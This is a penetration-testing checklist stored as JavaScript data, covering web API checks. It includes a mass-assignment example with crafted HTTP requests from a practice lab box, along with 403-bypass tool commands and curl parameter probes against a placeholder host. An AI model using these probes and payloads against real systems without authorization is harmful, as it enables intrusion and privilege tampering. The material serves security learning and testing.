checklist["web_api_check"] = [
    {
        chapter: "1. Initial web API checks",
        checks: [
            {
                title: "MASS assignment",
                description: "Check if mass assignment is possible by sending extra parameters in the request body.",
                code: `# 1. check forms for a mass assignment vulnerability, e.g. by adding an extra parameter in the request body that should not be there
##### example
# reference = Offsec box boolean (PG practice)

# 1A. POST request is send (original request)
POST /settings/email HTTP/1.1
Host: 192.168.124.231
.....

_method=patch&authenticity_token=uSUVZh6NUAqbJaLnpURJ_QO1vMvLDZsrb3HggiJDM67WuCnbNqwL-KSykEvODYbbNTGOXdwVHAIJbAK3RdPGAA&user%5Bemail%5D=test%40test.nl&commit=Change%20email

# 1B. returned the following JSON response
{
    "email": "test@test.nl",
    "id": 1,
    "username": "test",
    "confirmed": false, # < original value
    "created_at": "2025-10-27T17:39:41.784Z",
    "updated_at": "2025-10-27T17:39:41.784Z"
}

# 2A. try to add an extra parameter that should not be there, based off the JSON response: 'user%5Bconfirmed=true'
POST /settings/email HTTP/1.1
Host: 192.168.124.231
.....

_method=patch&authenticity_token=uSUVZh6NUAqbJaLnpURJ_QO1vMvLDZsrb3HggiJDM67WuCnbNqwL-KSykEvODYbbNTGOXdwVHAIJbAK3RdPGAA&user%5Bemail%5D=test%40test.nl&commit=Change%20email&user%5Bconfirmed%5D=true

# 2B. if the response shows that the 'confirmed' parameter is now set to true, the application is vulnerable to mass assignment
{
    "email": "test@test.nl",
    "confirmed": true, # < updated value
    "id": 1,
    "username": "test",
    "created_at": "2025-10-27T17:39:41.784Z",
    "updated_at": "2025-10-27T17:46:57.202Z"
}                 
`,
                code_language: bash,
            },
            {
                title: "HTTP methods",
                description: "Try multiple HTTP methods on the same API endpoints",
                code: `# 1. Try multiple HTTP methods on the same API endpoints
# GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, STRACE

# 2. Observe the responses for each method

# 3. Look for unexpected behavior, such as:
# - Sensitive data exposure
# - Unauthorized access
# - Method not allowed errors`,
                code_language: bash,
            },
            {
                title: "HTTP status codes",
                description: "Check the behavior of HTTP status codes",
                code: `# 1. check the output of different HTTP status codes
##### 404 Not Found #####
# might be interesting when:

# 1. page is custom made 
# 2. page does give back an (JSON) body

##### 405 method not allowed #####
# endpoint exists, but method is not allowed

`,
                code_language: bash,
            },
            {
                title: "403-bypass",
                description: "If you have come across a 403 page, try to bypass it.",
                code: `# 1. try to bypass the 403 page with common bypass techniques (https://github.com/0xrisec/4-ZERO-3/)
403-bypass.sh -u http://{{RHOST}}/logs --header | tee 403_bypass_output.txt

# 2. or try with all techniques that are known
403-bypass.sh -u http://{{RHOST}}/logs --exploit | tee 403_bypass_output.txt

# 3. check the output
# > filter on status, e.g.: 400, 200, 403, 404
# > then filter on length, e.g.:
cat 403_bypass_output.txt | grep "404" | cut -d "," -f 2 | cut -d ":" -f 2 | sort
`,
                code_language: bash,
            },
            {
                title: "applying parameters",
                description: "try multiple manner for applying parameters",
                code: `# 1. try to apply parameters in different ways, utilizing curl:
# 1A. parameters in the URL
curl -X GET "http://{{RHOST}}/api/v1/users?search=test"

# 1B. parameters in the body
curl -X POST "http://{{RHOST}}/api/v1/users" -d "search=test"

# 1C. parameters as json datas
curl -X POST "http://{{RHOST}}/api/v1/users" -H "Content-Type: application/json" -d '{"search": "test"}'

# 1D. parameters in the header
curl -X GET "http://{{RHOST}}/api/v1/users" -H "search: test"
`,
                code_language: bash,
            },
        ]
    }
]

// hard skills, proof or hardskills and someone to look at them